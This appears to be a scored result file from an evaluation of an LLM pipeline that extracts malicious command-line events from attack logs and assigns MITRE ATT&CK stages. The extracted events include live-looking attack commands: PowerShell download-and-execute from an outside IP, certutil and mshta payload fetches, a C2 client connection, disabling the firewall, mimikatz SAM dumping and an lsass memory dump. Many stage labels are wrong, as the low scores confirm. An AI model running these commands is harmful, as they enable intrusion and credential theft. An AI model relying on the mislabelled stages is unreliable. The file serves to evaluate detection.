@@ -1,0 +1,152 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0103\\u017du4\\u0107\\u012b\\u030f\\u0259...",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C \"cscript.exe  /e:VBScript.Encode T1059.007.vbs\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "CERTUTIL -URLCACHE -SPLIT -F HTTP://124.223.85.207:8082/TEST-HTA TEST.HTA",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "sangforcat.exe  -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh exe (PID 4816): \"netsh  advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sc query type=service > %TEMP%/T1119_1.txt & doskey /history > %TEMP%/T1119_2.txt & wmic process list > %TEMP%/T1119_3.txt & tree C:/AtomicRedTeam/atomics > %TEMP%/T1119_4.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C Netsh Advfirewall show allprofiles &  NetSh Advfirewall?set?allprofiles state off & echo \ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\u0479\u0440\ufffd& pause",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill  /f /im wordpad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "\"C:\\windows\\system32\\cmd.exe /c echo \ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\u0479\u0440\ufffd& pause\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"]\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "mimikatz2.exe  lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C \"procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C \"del /f /s lsass_dump.dmp\"",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attack begins with Initial Access via two different routes: the download of a malicious PowerShell script and the execution of a Python script located on the Desktop. This leads to a series of activities, including Defense Evasion, Discovery, Persistence, Lateral Movement, Privilege Escalation, Collection, and Credential Access. The attackers use various techniques to evade detection, collect information about the target environment, establish persistence, move laterally within the network, escalate privileges, and ultimately access sensitive credentials.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 88836,
+      "completion_tokens": 7638,
+      "total_tokens": 96474,
+      "wall_clock_s": 104.55,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.28,
+      "recall": 0.3333333333333333,
+      "f1": 0.30434782608695654,
+      "tp": 7,
+      "fp": 18,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.04,
+      "recall": 0.043478260869565216,
+      "f1": 0.041666666666666664,
+      "tp": 1,
+      "fp": 24,
+      "fn": 22,
+      "recall_partial": 0.21739130434782608
+    },
+    "hallucination_rate": 0.125,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 88836,
+      "completion_tokens": 7638,
+      "total_tokens": 96474,
+      "wall_clock_s": 104.55,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
